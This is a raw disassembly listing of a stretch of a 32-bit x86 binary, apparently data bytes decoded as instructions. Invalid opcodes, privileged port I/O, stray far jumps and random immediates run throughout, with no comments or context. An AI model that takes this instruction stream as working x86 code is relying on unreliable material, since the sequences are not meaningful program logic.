  41aaf2:	add    BYTE PTR [eax],al
  41aaf4:	test   DWORD PTR [ecx],0xfdfeb4dc
  41aafa:	inc    DWORD PTR [ebx+0x5f]
  41aafd:	sbb    BYTE PTR [esi+0x43],ah
  41ab00:	lds    edi,FWORD PTR [ecx]
  41ab02:	out    0xf4,eax
  41ab04:	cld    
  41ab05:	sbb    al,BYTE PTR [ecx]
  41ab07:	add    BYTE PTR [ecx+eax*1],al
  41ab0a:	add    BYTE PTR [eax],al
  41ab0c:	cmp    BYTE PTR [ebx+edi*8+0x52],ah
  41ab10:	mov    edx,0xf1313a25
  41ab15:	xor    BYTE PTR [eax+ebp*2+0x19be4be9],bl
  41ab1c:	push   ecx
  41ab1d:	push   edx
  41ab1e:	je     0x41ab8a
  41ab20:	in     al,0xd9
  41ab22:	sbb    al,0xda
  41ab24:	sti    
  41ab25:	sahf   
  41ab26:	cmp    eax,0x6c6ededa
  41ab2b:	sar    DWORD PTR [edx+0x2b],1
  41ab2e:	fisttp DWORD PTR [edx-0x8]
  41ab31:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ab32:	stos   BYTE PTR es:[edi],al
  41ab33:	stc    
  41ab34:	xor    esi,eax
  41ab36:	and    edx,ecx
  41ab38:	dec    ebp
  41ab39:	js     0x41ab1a
  41ab3b:	and    eax,ebp
  41ab3d:	dec    esi
  41ab3e:	ret    
  41ab3f:	jmp    0x13686c0
  41ab44:	pop    esi
  41ab45:	(bad)  
  41ab46:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ab47:	(bad)  
  41ab48:	sbb    ah,dl
  41ab4a:	jb     0x41ab1c
  41ab4c:	sbb    al,0xe4
  41ab4e:	mov    bl,0x1a
  41ab50:	xor    dl,BYTE PTR [edx]
  41ab52:	sahf   
  41ab53:	mov    ebx,0x7181180b
  41ab58:	push   edi
  41ab59:	aad    0x92
  41ab5b:	jb     0x41ab7a
  41ab5d:	sub    esi,ecx
  41ab5f:	inc    esp
  41ab60:	mul    BYTE PTR [edx]
  41ab62:	add    ah,BYTE PTR [ebx+0x6a]
  41ab65:	mov    ds:0xa3528612,al
  41ab6a:	or     cl,dh
  41ab6c:	lea    esi,ds:0x3792da03
  41ab72:	retf   
  41ab73:	add    eax,0x8f80a7d4
  41ab78:	es sub al,0x9f
  41ab7b:	xchg   edi,eax
  41ab7c:	mov    bl,0x54
  41ab7e:	ror    DWORD PTR es:[edx-0x65],0x3a
  41ab83:	adc    DWORD PTR [eiz*4-0x5c990f9f],edi
  41ab8a:	jecxz  0x41ab7f
  41ab8c:	mov    esp,0xb090244
  41ab91:	es stos BYTE PTR es:[edi],al
  41ab93:	jl     0x41abce
  41ab95:	stos   DWORD PTR es:[edi],eax
  41ab96:	xchg   edi,eax
  41ab97:	or     eax,0x9fa77e2
  41ab9c:	jb     0x41ab83
  41ab9e:	loope  0x41ab2e
  41aba0:	mov    bh,0x2a
  41aba2:	add    eax,0x67ffd214
  41aba7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41aba8:	xchg   esi,eax
  41aba9:	pop    esp
  41abaa:	add    DWORD PTR [edx+0x71],ecx
  41abad:	setnp  bh
  41abb0:	pop    ebp
  41abb1:	mov    esi,0x84e640ff
  41abb6:	arpl   WORD PTR [esi-0xb],di
  41abb9:	cld    
  41abba:	dec    eax
  41abbb:	bound  eax,QWORD PTR [ebx]
  41abbd:	js     0x41ab9e
  41abbf:	sbb    BYTE PTR [esi+0x72371fa7],ah
  41abc5:	cmp    DWORD PTR [eax],esp
  41abc7:	shr    BYTE PTR [ebp+0x2a],cl
  41abca:	add    ah,BYTE PTR [edx+0x32]
  41abcd:	les    edx,FWORD PTR [esi-0x2a8188e9]
  41abd3:	call   0x88b2:0x2a052d46
  41abda:	pusha  
  41abdb:	xchg   cl,bh
  41abdd:	arpl   WORD PTR [esi+eiz*2-0x1b],ax
  41abe1:	js     0x41ab8b
  41abe3:	ins    DWORD PTR es:[edi],dx
  41abe4:	jle    0x41ab6b
  41abe6:	xchg   DWORD PTR [esp+eiz*4+0x5e310240],eax
  41abed:	scas   eax,DWORD PTR es:[edi]
  41abee:	mov    fs,esi
  41abf0:	enter  0x796,0x41
  41abf4:	pop    ebx
  41abf5:	push   eax
  41abf6:	outs   dx,BYTE PTR ds:[esi]
  41abf7:	les    ebx,FWORD PTR [edx+0x6d9233a]
  41abfd:	or     ebp,DWORD PTR es:[ebp+edi*1+0x358b2e70]
  41ac05:	or     eax,0xdb56fc2
  41ac0a:	addr16 out 0xfc,al
  41ac0d:	bound  ebx,QWORD PTR [ebx+0xe6]
	...
  41ac73:	add    BYTE PTR [edx+0x49],ch
  41ac76:	es cmp al,0x27
  41ac79:	jg     0x41acf5
  41ac7b:	pop    edi
  41ac7c:	or     al,0x44
  41ac7e:	xor    ah,BYTE PTR [esi+esi*1-0x36]
  41ac82:	adc    ch,BYTE PTR [esi+0x0]
  41ac85:	sbb    al,0x1
  41ac87:	add    BYTE PTR [ecx+eax*1],al
  41ac8a:	add    BYTE PTR [eax],al
  41ac8c:	scas   eax,DWORD PTR es:[edi]
  41ac8d:	shr    BYTE PTR [ebx],1
  41ac8f:	mov    edi,0x71d30c5
  41ac94:	xor    esp,esp
  41ac96:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ac97:	outs   dx,BYTE PTR ds:[esi]
  41ac98:	pop    esp
  41ac99:	and    ecx,DWORD PTR [ecx]
  41ac9b:	mov    bh,0xae
  41ac9e:	outs   dx,DWORD PTR ds:[esi]
  41ac9f:	push   ebx
  41aca0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41aca2:	jbe    0x41ac3a
  41aca4:	mov    eax,ds:0x36b4638a
  41aca9:	jge    0x41aca5
  41acab:	icebp  
  41acac:	imul   DWORD PTR [ebp-0x9]
  41acaf:	dec    ebx
  41acb0:	aas    
  41acb1:	push   0xc0c2392a
  41acb6:	icebp  
  41acb7:	mov    eax,ds:0x7ce9642c
  41acbc:	ficomp WORD PTR [ecx]
  41acbe:	push   edx
  41acbf:	push   ebp
  41acc0:	inc    esp
  41acc1:	cmp    DWORD PTR [edi],ecx
  41acc3:	mov    cl,0x87
  41acc5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41acc6:	inc    ebx
  41acc7:	mul    BYTE PTR [ebp-0x22]
  41acca:	popf   
  41accb:	add    DWORD PTR [esi+eiz*1-0x3f1733b6],0xd3a970a6
  41acd6:	and    edx,edx
  41acd8:	rcl    BYTE PTR [eax],0x3b
  41acdb:	mul    ebp
  41acdd:	mov    dh,0x7f
  41acdf:	int3   
  41ace0:	gs repz jo 0x41ad41
  41ace4:	sbb    bh,BYTE PTR [edx+0x22]
  41ace7:	int    0x49
  41ace9:	fdiv   st(4),st
  41aceb:	xchg   ecx,eax
  41acec:	test   DWORD PTR [edx-0x55],edx
  41acef:	jecxz  0x41ad30
  41acf1:	cwde   
  41acf2:	pop    edi
  41acf3:	dec    DWORD PTR [ebp-0xe]
  41acf6:	jns    0x41ad40
  41acf8:	xchg   BYTE PTR ds:0x322142dc,dh
  41acfe:	xchg   ebx,eax
  41acff:	jmp    FWORD PTR [edi-0x5c]
  41ad02:	repnz pop ebp
  41ad04:	xchg   esp,eax
  41ad05:	push   ss
  41ad06:	add    bl,BYTE PTR [edi]
  41ad08:	addr16 push ss
  41ad0a:	cmp    edi,DWORD PTR [edi]
  41ad0c:	repz in eax,dx
  41ad0e:	xor    DWORD PTR [eax+ebx*4],esi
  41ad11:	sub    edi,DWORD PTR [eax+0x498fd180]
  41ad17:	inc    ebx
  41ad18:	xchg   ebp,eax
  41ad19:	ss dec ecx
  41ad1b:	jns    0x41acb5
  41ad1d:	ja     0x41ad26
  41ad1f:	xor    al,cl
  41ad21:	inc    ebx
  41ad22:	ret    0x2ed2
  41ad25:	cmp    eax,0x829fef52
  41ad2a:	and    ah,BYTE PTR [ecx]
  41ad2c:	test   al,0x99
  41ad2e:	inc    ecx
  41ad2f:	cli    
  41ad30:	xchg   esi,eax
  41ad31:	fimul  WORD PTR [edi+0x3d65fee4]
  41ad37:	stc    
  41ad38:	mov    al,ds:0x4c0b0027
  41ad3d:	cmp    BYTE PTR [edx],al
  41ad3f:	into   
  41ad40:	or     bh,BYTE PTR [ecx-0x80]
  41ad43:	xchg   esp,ebx
  41ad45:	adc    eax,0xb58955a9
  41ad4a:	outs   dx,BYTE PTR ds:[esi]
  41ad4b:	test   eax,0x6ba2f94c
  41ad50:	dec    ebp
  41ad51:	xor    BYTE PTR [ecx],cl
  41ad53:	shr    DWORD PTR [eax-0x1b],0x44
  41ad57:	repz arpl WORD PTR [ecx-0x69a7c335],bx
  41ad5e:	cwde   
  41ad5f:	dec    ebp
  41ad60:	bound  esi,QWORD PTR [eax+0x1c]
  41ad63:	xchg   edx,eax
  41ad64:	xchg   ebx,eax
  41ad65:	ds cmp eax,0x155d0311
  41ad6b:	aas    
  41ad6c:	adc    edx,DWORD PTR ds:[esi]
  41ad6f:	pop    es
  41ad70:	stos   BYTE PTR es:[edi],al
  41ad71:	push   es
  41ad72:	mov    edx,0x8595aa25
  41ad77:	inc    edx
  41ad78:	cmc    
  41ad79:	sub    ch,BYTE PTR [ecx-0x4e17ef75]
  41ad7f:	loopne 0x41ad8d
  41ad81:	dec    eax
  41ad82:	push   esi
  41ad83:	inc    esp
  41ad84:	sub    al,0x8
  41ad86:	adc    edi,DWORD PTR [ebp+0x2c83925b]
  41ad8c:	icebp  
  41ad8d:	xchg   ebx,eax
  41ad8e:	fstp   QWORD PTR [ebx+0x0]
	...
  41adf1:	add    BYTE PTR [eax],al
  41adf3:	add    BYTE PTR [ebp-0x8],dl
  41adf6:	or     DWORD PTR [esi-0x4280053],ebx
  41adfc:	dec    edi
  41adfd:	push   eax
  41adfe:	cmp    DWORD PTR [edi+ecx*4+0x4251638],esp
  41ae05:	sbb    eax,0x1040001
  41ae0a:	add    BYTE PTR [eax],al
  41ae0c:	arpl   bx,cx
  41ae0e:	dec    DWORD PTR [ebp+ebp*4-0x5bade387]
  41ae15:	mov    eax,0x958d677
  41ae1a:	in     eax,dx
  41ae1b:	mov    edi,0x4a88f441
  41ae20:	cld    
  41ae21:	mov    DWORD PTR [ecx-0x15],0x9651b5fd
  41ae28:	sbb    esi,DWORD PTR [ebx]
  41ae2a:	ins    DWORD PTR es:[edi],dx
  41ae2b:	idiv   BYTE PTR [bp+di]
  41ae2e:	call   0x1f5e:0x174d7992
  41ae35:	fcom   QWORD PTR [ecx+0x1ecc819d]
  41ae3b:	arpl   WORD PTR [ecx+0x49],cx
  41ae3e:	sub    eax,0x3fa7d334
  41ae43:	sbb    al,0x7c
  41ae45:	fstp   TBYTE PTR [edi-0x51]
  41ae48:	inc    eax
  41ae49:	fs (bad) 
  41ae4b:	xor    BYTE PTR [ecx],bl
  41ae4d:	xchg   BYTE PTR [edx+0x49f37d02],cl
  41ae53:	scas   eax,DWORD PTR es:[edi]
  41ae54:	and    al,0x5c
  41ae56:	pop    ds
  41ae57:	std    
  41ae58:	dec    eax
  41ae5a:	cld    
  41ae5b:	arpl   WORD PTR [ecx+eiz*1+0x3113a2e6],cx
  41ae62:	test   eax,0x69be4591
  41ae67:	lds    ebx,FWORD PTR [ecx+eiz*4+0x4e]
  41ae6b:	pusha  
  41ae6c:	mov    edx,DWORD PTR ds:0x885bab4e
  41ae72:	repnz dec ebx
  41ae74:	popa   
  41ae75:	rcr    BYTE PTR [eax],cl
  41ae77:	fisttp WORD PTR [ebx-0x24]
  41ae7a:	int3   
  41ae7b:	lods   al,BYTE PTR ds:[esi]
  41ae7c:	in     eax,0x65
  41ae7e:	test   DWORD PTR [ebx-0x5],0x464e7125
  41ae85:	xlat   BYTE PTR ds:[ebx]
  41ae86:	add    al,0x36
  41ae88:	popf   
  41ae89:	push   edi
  41ae8a:	sbb    BYTE PTR [eax+0x78d43afb],0xf0
  41ae91:	adc    BYTE PTR [eax-0x1f6e8228],ah
  41ae97:	ss dec eax
  41ae99:	mov    edx,0x6ed4315d
  41ae9e:	mov    ch,0xfb
  41aea0:	ret    0x1437
  41aea3:	pop    esi
  41aea4:	fucomi st,st(4)
  41aea6:	outs   dx,DWORD PTR ds:[esi]
  41aea7:	mov    edi,0xc4fcf2b9
  41aeac:	mov    eax,ds:0x8822cfe6
  41aeb1:	dec    edi
  41aeb2:	outs   dx,BYTE PTR ds:[esi]
  41aeb3:	fidivr WORD PTR [edi]
  41aeb5:	sbb    al,BYTE PTR [ebx]
  41aeb7:	cwde   
  41aeb8:	(bad)
  41aebb:	pop    ds
  41aebc:	adc    edi,DWORD PTR [edi-0x6b]
  41aebf:	add    eax,0xdbb1017a
  41aec4:	je     0x41ae4c
  41aec6:	jg     0x41af0a
  41aec8:	aaa    
  41aec9:	sbb    DWORD PTR [eax-0x2a75a74a],edi
  41aecf:	lahf   
  41aed0:	mov    DWORD PTR ds:0x18626168,esp
  41aed6:	inc    esi
  41aed7:	test   al,0xba
  41aed9:	or     BYTE PTR [ebp+0x1b9aadea],bl
  41aedf:	shr    DWORD PTR [edx+ebp*1+0x41],0x1
  41aee4:	sbb    ch,ah
  41aee6:	mov    cl,0xed
  41aee8:	or     cl,BYTE PTR [eax-0x48ca94c0]
  41aeee:	pop    ebp
  41aeef:	and    DWORD PTR [eax-0x3f0d0786],eax
  41aef5:	dec    esp
  41aef6:	ss inc edi
  41aef8:	dec    ecx
  41aef9:	jns    0x41af4f
  41aefb:	pushf  
  41aefc:	jg     0x41af19
  41aefe:	hlt    
  41aeff:	bound  eax,QWORD PTR [ecx]
  41af01:	mov    edx,0x5955121f
  41af06:	inc    edx
  41af07:	repnz in al,0x2
  41af0a:	out    dx,al
  41af0b:	mov    es,ebx
  41af0d:	jo     0x41ae91
  41af0f:	xlat   BYTE PTR ds:[ebx]
	...
  41af74:	(bad)  
  41af77:	xor    edi,DWORD PTR [ebp+0x15ffdf77]
  41af7d:	mov    ecx,0xb09144ee
  41af82:	mov    al,ds:0x11e081b
  41af87:	add    BYTE PTR [ecx+eax*1],al
  41af8a:	add    BYTE PTR [eax],al
  41af8c:	js     0x41af56
  41af8e:	(bad)
  41af91:	sbb    BYTE PTR [ecx],bh
  41af93:	xchg   DWORD PTR [ebx],ebp
  41af95:	mov    cl,0xa1
  41af97:	leave  
  41af98:	jb     0x41afb8
  41af9a:	mov    ecx,0x3f8450cd
  41af9f:	push   cs
  41afa0:	push   ecx
  41afa1:	or     eax,0x431c58d7
  41afa6:	jp     0x41af2c
  41afa8:	pop    ebx
  41afa9:	bound  esi,QWORD PTR ds:0x2c2fbd91
  41afaf:	adc    bl,cl
  41afb1:	push   DWORD PTR [ebx-0x776f17eb]
  41afb7:	or     dh,BYTE PTR [eax]
  41afb9:	sbb    bh,cl
  41afbb:	fbstp  TBYTE PTR [edi]
  41afbd:	shl    ecx,1
  41afbf:	inc    esp
  41afc0:	sar    edx,cl
  41afc2:	aam    0x49
  41afc4:	in     al,dx
  41afc5:	cld    
  41afc6:	xchg   edx,eax
  41afc7:	outs   dx,BYTE PTR ds:[esi]
  41afc8:	jg     0x41afa9
  41afca:	push   ss
  41afcb:	jo     0x41afce
  41afcd:	pop    ecx
  41afce:	add    edx,DWORD PTR [ecx-0x76]
  41afd1:	shr    DWORD PTR ds:0x1e714e54,1
  41afd7:	addr16 mov ebx,0x39fdac1
  41afdd:	push   esi
  41afde:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41afdf:	pusha  
  41afe0:	rcl    DWORD PTR [eax+ebp*4],1
  41afe3:	(bad)  
  41afe4:	(bad)  
  41afe5:	retf   
  41afe6:	lods   al,BYTE PTR ds:[esi]
  41afe7:	inc    esi
  41afe8:	shr    BYTE PTR [edi+0x11328a1e],1
  41afee:	add    BYTE PTR [eax+0x1fcd],ah
  41aff4:	push   0xffffff88
  41aff6:	jae    0x41afea
  41aff8:	mov    ebx,0xe473c52e
  41affd:	das    
  41affe:	fstp   QWORD PTR [eax]
  41b000:	nop
  41b001:	mov    edi,0x4a76b222
  41b006:	int3   
  41b007:	out    0x55,eax
  41b009:	iret   
  41b00a:	pop    ebx
  41b00b:	dec    eax
  41b00c:	iret   
  41b00d:	cdq    
  41b00e:	mov    es,WORD PTR [esi+0xa]
  41b011:	or     ebp,edx
  41b013:	sar    DWORD PTR [eax+0x34],1
  41b016:	or     dh,bh
  41b018:	mov    esi,0x7cd93653
  41b01d:	test   al,0xcb
  41b01f:	add    ch,cl
  41b021:	jne    0x41b05e
  41b023:	inc    edi
  41b024:	outs   dx,DWORD PTR ds:[esi]
  41b025:	test   eax,0x435aa475
  41b02a:	(bad)  
  41b02b:	ror    BYTE PTR ds:[edi-0x8],0xe5
  41b030:	sbb    BYTE PTR [ebx+0x14455d5b],0x1e
  41b037:	popa   
  41b038:	mov    ecx,0x60df2a4b
  41b03d:	enter  0x5bd5,0x9c
  41b041:	fwait
  41b042:	ret    
  41b043:	out    0xe3,al
  41b045:	lods   eax,DWORD PTR ds:[esi]
  41b046:	imul   eax,DWORD PTR [edi+0x64],0x9eed6c90
  41b04d:	adc    ah,BYTE PTR [eax-0x4a86befb]
  41b053:	into   
  41b054:	xchg   ebp,eax
  41b055:	and    BYTE PTR [edx-0x32708c92],dl
  41b05b:	adc    DWORD PTR [ebp-0x5e],edi
  41b05e:	cmp    al,0x80
  41b060:	or     dh,BYTE PTR [eax+0x4d]
  41b063:	pop    ebx
  41b064:	rcl    DWORD PTR [edx+0x1f557444],0x2d
  41b06b:	xchg   DWORD PTR [esp+edi*8-0x38dc1db4],ebp
  41b072:	mov    ah,0x9d
  41b074:	jb     0x41b01b
  41b076:	test   DWORD PTR [eax+eiz*2],ecx
  41b079:	inc    ebp
  41b07a:	into   
  41b07b:	das    
  41b07c:	xchg   BYTE PTR [edi+0x44],dl
  41b07f:	ret    0x5e83
  41b082:	jg     0x41b04b
  41b084:	test   DWORD PTR [eax+0x2d],edi
  41b087:	bound  eax,QWORD PTR [eax]
  41b089:	jne    0x41b0f3
  41b08b:	pop    eax
  41b08c:	sbb    DWORD PTR [ebx],ebx
  41b08e:	ds add BYTE PTR cs:[eax],al
	...
  41b0f2:	add    BYTE PTR [eax],al
  41b0f4:	(bad)  
  41b0f5:	ficom  WORD PTR [eax]
  41b0f7:	stos   DWORD PTR es:[edi],eax
  41b0f8:	sbb    bh,ch
  41b0fa:	(bad)  
  41b0fb:	call   DWORD PTR [edx+edx*8+0x75]
  41b0ff:	mov    edi,0x4bc00568
  41b104:	or     al,0x1f
  41b106:	add    DWORD PTR [eax],eax
  41b108:	add    al,0x1
  41b10a:	add    BYTE PTR [eax],al
  41b10c:	std    
  41b10d:	or     edx,DWORD PTR [edx-0x6d]
  41b110:	es sbb al,0x27
  41b113:	xchg   BYTE PTR [esp+ebp*1+0x315d945a],bh
  41b11a:	dec    esp
  41b11b:	js     0x41b0b2
  41b11d:	jne    0x41b16c
  41b11f:	pop    ebx
  41b120:	and    ch,BYTE PTR [edi-0x7c]
  41b123:	cli    
  41b124:	push   ebp
  41b125:	mov    ss,WORD PTR ds:0xb33c66e5
  41b12b:	retf   
  41b12c:	jo     0x41b11c
  41b12e:	jmp    DWORD PTR [ebx+0x51]
  41b131:	sti    
  41b132:	fild   DWORD PTR [ebx]
  41b134:	add    eax,DWORD PTR [esi+esi*4-0x2f325ecf]
  41b13b:	pushf  
  41b13c:	sub    DWORD PTR [ebx+0x35],esp
  41b13f:	test   bh,0x44
  41b142:	std    
  41b143:	mov    bl,0x7c
  41b145:	mov    ch,0x7d
  41b147:	add    eax,0xbfcaa2ad
  41b14c:	test   DWORD PTR [ebx+edi*8+0x6513f5e],eax
  41b153:	pushf  
  41b154:	mov    edx,DWORD PTR [ecx+0x7216c360]
  41b15a:	xchg   edx,eax
  41b15b:	inc    ebp
  41b15c:	adc    al,0x53
  41b15e:	mov    dl,0xcc
  41b160:	out    0x45,al
  41b162:	pop    esi
  41b163:	xchg   eax,ebp
  41b165:	imul   ebp,DWORD PTR [ecx],0x37a65283
  41b16b:	imul   DWORD PTR [edx]
  41b16d:	(bad)  
  41b16e:	sbb    eax,0x1626e473
  41b173:	cmp    DWORD PTR [ebx],esp
  41b175:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b176:	push   eax
  41b177:	or     BYTE PTR [edi-0x29],dh
  41b17a:	shl    DWORD PTR [eax],0x48
  41b17d:	lds    ecx,FWORD PTR [ebp-0x1a39fcf9]
  41b183:	(bad)  
  41b184:	xchg   ebx,eax
  41b185:	dec    edi
  41b186:	sub    DWORD PTR ds:0x865066a8,edi
  41b18c:	(bad)
  41b190:	xchg   ebp,eax
  41b191:	adc    edx,ebx
  41b193:	(bad)  [edx]
  41b195:	mov    ecx,0x80a85d91
  41b19a:	in     al,0x33
  41b19c:	sbb    edx,DWORD PTR [ebp-0x68]
  41b19f:	or     BYTE PTR ds:0xe7470ce4,ah
  41b1a5:	sbb    ecx,DWORD PTR ds:0x611c3e2a
  41b1ab:	jno    0x41b229
  41b1ad:	cdq    
  41b1ae:	fwait
  41b1af:	xor    eax,DWORD PTR [edi]
  41b1b1:	ins    BYTE PTR es:[edi],dx
  41b1b2:	sub    BYTE PTR [eax-0x57],dh
  41b1b5:	aam    0xcb
  41b1b7:	sbb    al,0x79
  41b1b9:	or     esi,0xffffffd2
  41b1bc:	sti    
  41b1bd:	in     eax,0x9c
  41b1bf:	add    eax,0xdcd80044
  41b1c4:	xchg   esi,eax
  41b1c5:	fidivr DWORD PTR [ebx-0x601ead3f]
  41b1cb:	loope  0x41b166
  41b1cd:	aam    0xa9
  41b1cf:	aaa    
  41b1d0:	(bad)  
  41b1d1:	sub    ecx,DWORD PTR ds:0xd714ed73
  41b1d7:	test   al,0x40
  41b1d9:	rol    DWORD PTR [ecx-0x42c14609],1
  41b1df:	adc    BYTE PTR [esp+ebx*1],bl
  41b1e2:	mov    edi,0xb74a413d
  41b1e7:	sub    DWORD PTR [esi+0x40e213f2],esi
  41b1ed:	jmp    0x5b7c695f
  41b1f2:	mov    eax,ds:0xe25bb30d
  41b1f7:	dec    ecx
  41b1f8:	test   al,0x44
  41b1fa:	jg     0x41b21a
  41b1fc:	mov    cl,0x29
  41b1fe:	scas   al,BYTE PTR es:[edi]
  41b1ff:	cmp    eax,0xc1f534b8
  41b204:	out    0x7b,eax
  41b206:	cs pop edi
  41b208:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  41b20a:	dec    eax
  41b20b:	ins    BYTE PTR es:[edi],dx
  41b20c:	push   esi
  41b20d:	jns    0x41b1f1
  41b20f:	pushf  
	...
  41b274:	mov    fs,WORD PTR [ebp-0x13941f97]
  41b27a:	(bad)  
  41b27b:	out    dx,eax
  41b27c:	stos   BYTE PTR es:[edi],al
  41b27d:	jge    0x41b21a
  41b27f:	or     BYTE PTR [ecx-0x7e],ch
  41b282:	push   esp
  41b283:	mov    ah,0x10
  41b285:	and    BYTE PTR [ecx],al
  41b287:	add    BYTE PTR [ecx+eax*1],al
  41b28a:	add    BYTE PTR [eax],al
  41b28c:	sbb    al,0x6a
  41b28e:	jb     0x41b285
  41b290:	jg     0x41b221
  41b292:	or     ebx,DWORD PTR [eax]
  41b294:	pop    ds
  41b295:	xor    DWORD PTR [ebp-0x9],esi
  41b298:	sbb    BYTE PTR [edx-0x4a],dh
  41b29b:	call   0xb7cf5111
  41b2a0:	cmp    DWORD PTR [edi+0x4b],ecx
  41b2a3:	shl    ah,1
  41b2a5:	enter  0x9e3d,0xd5
  41b2a9:	mov    dh,0xd7
  41b2ab:	mov    ch,0x23
  41b2ad:	ss mov ecx,0x9b9f8697
  41b2b3:	xlat   BYTE PTR ds:[ebx]
  41b2b4:	aaa    
  41b2b5:	repz das 
  41b2b7:	sub    BYTE PTR [ebp-0x22bfabf5],0x8
  41b2be:	cdq    
  41b2bf:	mov    ah,0xde
  41b2c1:	outs   dx,DWORD PTR ds:[esi]
  41b2c2:	fsub   DWORD PTR [edx+0x6b8783d1]
  41b2c8:	popa   
  41b2c9:	push   ebp
  41b2ca:	sub    eax,DWORD PTR ds:0xf958b948
  41b2d0:	mov    esi,0xb6d35d51
  41b2d5:	(bad)  
  41b2d6:	xor    eax,0x66c2ad93
  41b2db:	ins    DWORD PTR es:[edi],dx
  41b2dc:	or     bh,ch
  41b2de:	stos   DWORD PTR es:[edi],eax
  41b2df:	psubd  mm7,QWORD PTR [edx-0x3]
  41b2e3:	push   es
  41b2e4:	sbb    al,0x21
  41b2e6:	mov    ?,WORD PTR [ecx]
  41b2e8:	inc    ebx
  41b2e9:	test   eax,0x9d8609e
  41b2ee:	jmp    0x8849:0x85eced52
  41b2f5:	ins    BYTE PTR es:[edi],dx
  41b2f6:	sbb    eax,0x38fd11d5
  41b2fb:	outs   dx,BYTE PTR ds:[esi]
  41b2fc:	or     dl,BYTE PTR [edx+edi*8]
  41b2ff:	sub    ch,dh
  41b301:	add    esp,ebp
  41b303:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b304:	in     al,0x5b
  41b306:	jne    0x41b2e3
  41b308:	pop    esi
  41b309:	rol    edx,0xbd
  41b30c:	pop    edx
  41b30d:	or     BYTE PTR [edx+0x7e],bh
  41b310:	xor    al,0x95
  41b312:	and    ecx,ebp
  41b314:	test   eax,0x8737588b
  41b319:	out    0x48,al
  41b31b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b31c:	outs   dx,BYTE PTR ds:[esi]
  41b31d:	adc    eax,DWORD PTR [edx]
  41b31f:	add    eax,0xe579cd33
  41b324:	pop    edx
  41b325:	iret   
  41b326:	pop    esi
  41b327:	jmp    0xeb693095
  41b32c:	mov    eax,0xd58fbf16
  41b331:	mov    ds:0xafa19a88,eax
  41b336:	in     al,dx
  41b337:	scas   al,BYTE PTR es:[edi]
  41b338:	mov    edx,0x8a05331c
  41b33d:	ret    
  41b33e:	cmp    dl,cl
  41b340:	fwait
  41b341:	aam    0x3a
  41b343:	and    eax,DWORD PTR [ebx-0x1ced866e]
  41b349:	jbe    0x41b3bb
  41b34b:	fwait
  41b34c:	mov    DWORD PTR [edi-0x61],edx
  41b34f:	fs stos DWORD PTR es:[edi],eax
  41b351:	sub    edx,ebx
  41b353:	mov    eax,ds:0x48a08a92
  41b358:	cdq    
  41b359:	cmpps  xmm3,XMMWORD PTR [eax-0x4c1c92f4],0xf1
  41b361:	sub    dl,BYTE PTR [edi+0x0]
  41b364:	inc    ecx
  41b365:	xchg   ecx,eax
  41b366:	stos   DWORD PTR es:[edi],eax
  41b367:	into   
  41b368:	std    
  41b369:	js     0x41b3af
  41b36b:	add    edi,DWORD PTR [eax+0x46]
  41b36e:	mov    gs,WORD PTR [edx-0x53]
  41b371:	cmp    al,0x55
  41b373:	ficomp DWORD PTR [ebp+0x490bc315]
  41b379:	xchg   esp,eax
  41b37a:	ret    0x6c09
  41b37d:	sub    ch,dh
  41b37f:	xchg   ebx,eax
  41b380:	xchg   DWORD PTR [eax+0x3b932c3d],ebp
  41b386:	ret    
  41b387:	fbld   TBYTE PTR [edi+0x43062a38]
  41b38d:	test   BYTE PTR ss:[ebp+0x0],ah
	...
  41b3f1:	add    BYTE PTR [eax],al
  41b3f3:	add    BYTE PTR [eax+0xd],cl
  41b3f6:	sbb    eax,0xfebb5dab
  41b3fb:	out    dx,eax
  41b3fc:	xchg   ebp,eax
  41b3fd:	iret   
  41b3fe:	push   ebx
  41b3ff:	aas    
  41b400:	add    esi,DWORD PTR [ecx+0x79]
  41b403:	mov    ss,WORD PTR [ecx+eiz*1]
  41b406:	add    DWORD PTR [eax],eax
  41b408:	add    al,0x1
  41b40a:	add    BYTE PTR [eax],al
  41b40c:	pusha  
  41b40d:	mov    ds:0x2efc6da8,al
  41b412:	cli    
  41b413:	mov    ds:0x5c96f2c2,eax
  41b418:	add    cl,BYTE PTR [ebp+0x2ee7a3d3]
  41b41e:	pop    eax
  41b41f:	push   0xffffffe3
  41b421:	mov    BYTE PTR [ebx],bh
  41b423:	lock mov edi,0x57c19cec
  41b429:	dec    esi
  41b42a:	mul    BYTE PTR [edi+0x6]
  41b42d:	mov    fs,WORD PTR [eax]
  41b42f:	jae    0x41b3d5
  41b431:	xchg   esi,eax
  41b432:	stos   BYTE PTR es:[edi],al
  41b433:	in     eax,dx
  41b434:	dec    edi
  41b435:	and    al,bh
  41b437:	jg     0x41b3fa
  41b439:	sbb    BYTE PTR [esi-0x45],ah
  41b43c:	push   edx
  41b43d:	scas   eax,DWORD PTR es:[edi]
  41b43e:	mov    bh,0x94
  41b440:	ss (bad) 
  41b443:	stc    
  41b444:	mov    BYTE PTR [ebx],al
  41b446:	xor    al,BYTE PTR [edi-0x4f]
  41b449:	cmp    al,0x18
  41b44b:	push   ss
  41b44c:	push   ecx
  41b44d:	loopne 0x41b4b3
  41b44f:	aas    
  41b450:	dec    ecx
  41b451:	cld    
  41b452:	cmp    BYTE PTR [edi+0xb],dl
  41b455:	mov    bl,0xff
  41b457:	jb     0x41b447
  41b459:	test   eax,0x31e6e9c1
  41b45e:	stos   DWORD PTR es:[edi],eax
  41b45f:	or     BYTE PTR [ebx],dl
  41b461:	imul   esp,DWORD PTR [ebp-0x53],0x6d216cf5
  41b468:	jge    0x41b42f
  41b46a:	fsubr  st(1),st
  41b46c:	jne    0x41b43a
  41b46e:	into   
  41b46f:	or     dl,al
  41b471:	inc    ebx
  41b472:	jge    0x41b4ef
  41b474:	retf   
  41b475:	not    DWORD PTR [ebx-0x18]
  41b478:	out    0x7e,al
  41b47a:	adc    esp,DWORD PTR [eax-0xf]
  41b47d:	push   cs
  41b47e:	bound  edx,QWORD PTR [edx+0x1e]
  41b481:	mov    al,0x39
